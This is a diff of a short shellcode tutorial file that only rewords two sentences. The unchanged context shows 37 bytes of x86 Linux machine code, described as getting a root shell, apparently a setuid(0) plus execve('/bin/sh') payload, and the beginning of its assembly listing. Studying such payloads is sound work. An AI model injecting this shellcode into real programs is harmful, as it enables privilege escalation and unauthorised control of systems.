@@ -1,12 +1,12 @@
 
-With the following machine code you can get a root shell:
+With the following machine code we can get a root shell:
 
 31 C0 31 DB B0 17 CD 80 EB 1F 5E 89 76 08 31 C0
 88 46 07 89 46 0C B0 0B 89 F3 8D 4E 08 8D 56 0C
 CD 80 31 DB 89 D8 40 CD 80 E8 DC FF FF FF 2F 62
 69 6E 2F 73 68
 
-its asm code:
+And the asm code:
 
 seg000:00000000 loc_0:
 seg000:00000000 	    xor		eax, eax
